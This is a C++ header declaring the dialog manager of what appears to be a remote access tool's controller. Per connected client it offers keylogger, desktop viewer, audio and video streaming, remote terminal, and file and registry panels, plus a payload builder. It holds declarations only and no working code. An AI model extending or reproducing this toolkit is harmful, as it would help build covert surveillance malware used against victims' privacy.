#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <memory>
#include <map>
#include "../../Common/Config.h"

// 前向声明
struct ConnectedClient;

namespace Formidable {
namespace UI {

// UI管理器 - 统一管理所有对话框
class UIManager {
public:
    // 初始化UI管理器
    static void Initialize(HINSTANCE hInstance, HWND hMainWnd);
    
    // 显示各种对话框
    static void ShowProcessManager(std::shared_ptr<ConnectedClient> client);
    static void ShowFileManager(std::shared_ptr<ConnectedClient> client);
    static void ShowWindowManager(std::shared_ptr<ConnectedClient> client);
    static void ShowServiceManager(std::shared_ptr<ConnectedClient> client);
    static void ShowRegistryManager(std::shared_ptr<ConnectedClient> client);
    static void ShowTerminal(std::shared_ptr<ConnectedClient> client);
    static void ShowDesktopViewer(std::shared_ptr<ConnectedClient> client);
    static void ShowKeylogger(std::shared_ptr<ConnectedClient> client);
    static void ShowAudioStream(std::shared_ptr<ConnectedClient> client);
    static void ShowVideoStream(std::shared_ptr<ConnectedClient> client);
    
    // 显示系统对话框
    static void ShowBuilder();
    static void ShowSettings();
    static void ShowAbout();
    
    // 关闭客户端的所有对话框
    static void CloseClientDialogs(std::shared_ptr<ConnectedClient> client);
    
    // 更新对话框数据
    static void UpdateProcessList(uint32_t clientId, const std::string& data);
    static void UpdateWindowList(uint32_t clientId, const std::string& data);
    static void UpdateServiceList(uint32_t clientId, const std::string& data);
    static void UpdateFileList(uint32_t clientId, const std::string& data);
    static void UpdateRegistryData(uint32_t clientId, const std::string& data);
    
private:
    static HINSTANCE s_hInstance;
    static HWND s_hMainWnd;
    
    // 记录已打开的对话框
    static std::map<uint32_t, HWND> s_processDialogs;
    static std::map<uint32_t, HWND> s_fileDialogs;
    static std::map<uint32_t, HWND> s_windowDialogs;
    static std::map<uint32_t, HWND> s_serviceDialogs;
    static std::map<uint32_t, HWND> s_registryDialogs;
    static std::map<uint32_t, HWND> s_terminalDialogs;
    static std::map<uint32_t, HWND> s_desktopDialogs;
    static std::map<uint32_t, HWND> s_keylogDialogs;
    
    // 防止重复打开
    static bool IsDialogOpen(const std::map<uint32_t, HWND>& dialogMap, uint32_t clientId);
    static void RegisterDialog(std::map<uint32_t, HWND>& dialogMap, uint32_t clientId, HWND hDlg);
    static void UnregisterDialog(std::map<uint32_t, HWND>& dialogMap, uint32_t clientId);
};

} // namespace UI
} // namespace Formidable
